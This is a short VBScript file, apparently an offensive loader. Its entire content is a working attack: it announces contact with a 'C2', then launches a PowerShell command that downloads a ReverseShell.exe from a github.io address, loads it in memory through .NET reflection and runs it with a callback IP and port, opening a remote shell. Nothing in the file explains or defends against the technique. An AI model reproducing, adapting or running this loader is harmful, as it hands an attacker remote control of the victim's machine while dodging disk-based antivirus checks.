Set fso = CreateObject("Scripting.FileSystemObject")
Set stdout = fso.GetStandardStream(1)
stdout.WriteLine "[!] Contacting C2 Yahud"
arg = "$bytes=(New-Object Net.WebClient).DownloadData('https://hakkyahud.github.io/ReverseShell.exe');$assembly=[System.Reflection.Assembly]::Load($bytes);$entryPoint=$assembly.EntryPoint;[String[]]$parameter=@('192.168.1.110', '2936');$entryPoint.Invoke($null, (,$parameter));Read-Host;"
PScmd = "powershell -command " & arg
CreateObject("WScript.Shell").Run PScmd
